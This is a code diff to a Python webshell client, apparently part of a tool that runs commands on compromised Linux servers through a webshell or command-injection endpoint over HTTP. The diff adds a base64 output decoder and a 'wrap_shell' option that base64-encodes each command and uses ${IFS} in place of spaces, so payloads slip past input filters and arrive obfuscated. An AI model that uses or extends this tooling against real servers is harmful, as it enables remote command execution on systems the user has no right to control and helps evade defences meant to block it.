@@ -24,8 +24,8 @@ from ..utils.tools import user_json_loads
 logger = logging.getLogger("core.sessions.linux_cmd_oneliner")
 
 WRAPPER_CODE = """
-echo "{start1}""{start2}";
-({code})
+echo -n "{start1}""{start2}";
+({code}) {decoder}
 echo {stop}
 """
 
@@ -147,6 +147,25 @@ class LinuxCmdOneLiner:
             "name": "高级连接配置",
             "options": [
                 ConnOption(
+                    id="decoder",
+                    name="解码器",
+                    type="select",
+                    placeholder="raw",
+                    default_value="raw",
+                    alternatives=[
+                        {"name": "raw", "value": "raw"},
+                        {"name": "base64", "value": "base64"},
+                    ],
+                ),
+                ConnOption(
+                    id="wrap_shell",
+                    name="使用sh -c执行",
+                    type="checkbox",
+                    placeholder=None,
+                    default_value=False,
+                    alternatives=None,
+                ),
+                ConnOption(
                     id="https_verify",
                     name="验证HTTPS证书",
                     type="checkbox",
@@ -210,6 +229,9 @@ class LinuxCmdOneLiner:
         self.headers = user_json_loads(
             session_conn.get("extra_headers", "null"), (dict, type(None))
         )
+
+        self.decoder = session_conn.get("decoder", "raw")
+        self.wrap_shell = session_conn.get("wrap_shell", False)
 
         self.client = get_http_client(verify=self.https_verify)
 
@@ -461,7 +483,10 @@ class LinuxCmdOneLiner:
             start2=start2,
             code=payload if isinstance(payload, str) else shell_command(payload),
             stop=stop,
+            decoder={"raw": "", "base64": "|base64 -w0"}.get(self.decoder, "")
         )
+        if self.wrap_shell:
+            code = "sh -c echo${IFS}" + base64.b64encode(code.encode()).decode() + "|base64${IFS}-d|sh"
         status_code, html = await self.submit_http(code)
         if status_code == 404:
             raise exceptions.TargetUnreachable(
@@ -476,8 +501,15 @@ class LinuxCmdOneLiner:
             raise exceptions.PayloadOutputError(
                 "找不到输出文本的结尾，也许webshell没有执行代码？"
             )
-        result = html_afterstarted[: html_afterstarted.index(stop)]
-        return result.removeprefix("\n")
+        todecode = html_afterstarted[: html_afterstarted.index(stop)].removeprefix("\n")
+
+        if self.decoder == "base64":
+            # TODO: allow user defind target encoding
+            return base64.b64decode(todecode).decode()
+        if self.decoder == "raw":
+            return todecode
+        else:
+            raise exceptions.UserError("未知Decoder: " + self.decoder)
 
     async def submit_http(self, payload: t.Union[str, bytes]):
         try:
